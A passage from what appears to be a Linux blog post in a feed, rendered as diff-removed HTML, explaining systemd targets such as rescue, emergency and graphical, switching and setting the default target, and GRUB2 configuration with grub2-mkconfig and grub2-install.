-</span><span class='line'>  local-fs-pre.target    loaded    active   active Local File Systems (Pre)
-</span><span class='line'>  local-fs.target        loaded    active   active Local File Systems
-</span><span class='line'>  multi-user.target      loaded    active   active Multi-User System
-</span><span class='line'>  network-online.target  loaded    active   active Network is Online
-</span><span class='line'>  network-pre.target     loaded    inactive dead   Network (Pre)
-</span><span class='line'>  network.target         loaded    active   active Network
-</span><span class='line'>  nfs-client.target      loaded    active   active NFS client services
-</span><span class='line'>  nss-lookup.target      loaded    inactive dead   Host and Network Name Lookups
-</span><span class='line'>  nss-user-lookup.target loaded    active   active User and Group Name Lookups
-</span><span class='line'>  paths.target           loaded    active   active Paths
-</span><span class='line'>  remote-fs-pre.target   loaded    active   active Remote File Systems (Pre)
-</span><span class='line'>  remote-fs.target       loaded    active   active Remote File Systems
-</span><span class='line'>  rescue.target          loaded    inactive dead   Rescue Mode
-</span><span class='line'>  rpcbind.target         loaded    inactive dead   RPC Port Mapper
-</span><span class='line'>  shutdown.target        loaded    inactive dead   Shutdown
-</span><span class='line'>  slices.target          loaded    active   active Slices
-</span><span class='line'>  sockets.target         loaded    active   active Sockets
-</span><span class='line'>  swap.target            loaded    active   active Swap
-</span><span class='line'>  sysinit.target         loaded    active   active System Initialization
-</span><span class='line'>● syslog.target          not-found inactive dead   syslog.target
-</span><span class='line'>  time-sync.target       loaded    inactive dead   System Time Synchronized
-</span><span class='line'>  timers.target          loaded    active   active Timers
-</span><span class='line'>  umount.target          loaded    inactive dead   Unmount All Filesystems
-</span><span class='line'>
-</span><span class='line'>LOAD   = Reflects whether the unit definition was properly loaded.
-</span><span class='line'>ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
-</span><span class='line'>SUB    = The low-level unit activation state, values depend on unit type.
-</span><span class='line'>
-</span><span class='line'>29 loaded units listed.
-</span><span class='line'>To show all installed unit files use 'systemctl list-unit-files'.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Out of these, we will only look at the most relevant ones:</p>
-
-<ul>
-<li><p><strong>emergency.target</strong> = emergency mode. All you have is systemd and a shell. This is what you use if, for instance, you experience disk failure</p></li>
-<li><p><strong>rescue.target</strong> = single user mode. It&rsquo;s the equivalent of runlevel 1. In this mode, the early boot services are started and local mount points are mounted. No networking</p></li>
-<li><p><strong>multi-user.target</strong> = multi-user text mode with networking. Equivalent to runlevel 3</p></li>
-<li><p><strong>graphical.target</strong> = multi-user with GUI. Equivalent to runlevel 5</p></li>
-</ul>
-
-
-<p>Let&rsquo;s see what the default target is on my system:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl get-default
-</span><span class='line'>graphical.target</span></code></pre></td></tr></table></div></figure>
-
-
-<p>You can set a new default target with <code>systemctl set-default</code></p>
-
-<p>It is possible to switch to a different target without rebooting, by using <code>systemctl isolate <target name></code>. However, only targets with AllowIsolate=yes in their unit files can be isolated. Isolation will start or stop all necessary services for that particular target. You can use isolation to quickly switch between targets. You can achieve the same with the systemctl command:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl rescue
-</span><span class='line'>systemctl emergency</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Additionally, you can boot a desired target through the boot menu, by selecting <em>e</em> at the desired entry, and appending at the end of the kernel command line (the one starting with linux16) the entry <strong>systemd.unit=target name</strong></p>
-
-<h2>bootloader troubleshooting</h2>
-
-<p>Here we&rsquo;re only going to look at the grub2 bootloader. Its main configuration file is <code>/boot/grub2/grub.cfg</code>, but you&rsquo;re not supposed to edit it directly, but use <code>grub2-mkconfig</code> to generate the configuration. So you first edit the GRUB parameters in <code>/etc/default/grub</code>, and then run grub2-mkconfig to create the cfg file. Let&rsquo;s see the defaults I have:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/default/grub
-</span><span class='line'>GRUB_TIMEOUT=5
-</span><span class='line'>GRUB_DISTRIBUTOR="$(sed 's, release .*$,,g' /etc/system-release)"
-</span><span class='line'>GRUB_DEFAULT=saved
-</span><span class='line'>GRUB_DISABLE_SUBMENU=true
-</span><span class='line'>GRUB_TERMINAL_OUTPUT="console"
-</span><span class='line'>GRUB_CMDLINE_LINUX="crashkernel=auto rd.lvm.lv=rhel/root rd.lvm.lv=rhel/swap rhgb quiet"
-</span><span class='line'>GRUB_DISABLE_RECOVERY="true"</span></code></pre></td></tr></table></div></figure>
-
-
-<p>After editing those, you can run <code>grub2-mkconfig > /boot/grub2/grub.cfg</code> to create the new boot config file.</p>
-
-<p>If you need to reinstall the bootloader, you can do so with <code>grub2-install</code></p>
-
-<h3>Learn more</h3>
-
-<p><a href="https://fedoraproject.org/wiki/SysVinit_to_Systemd_Cheatsheet">SysVinit to Systemd Cheatsheet</a></p>
-
-<p><a href="https://lists.freedesktop.org/archives/systemd-devel/2016-February/035709.html">emergency mode vs rescue mode</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
-</span><span class='line'>/ You will always get the greatest        \
-</span><span class='line'>\ recognition for the job you least like. /
-</span><span class='line'> -----------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
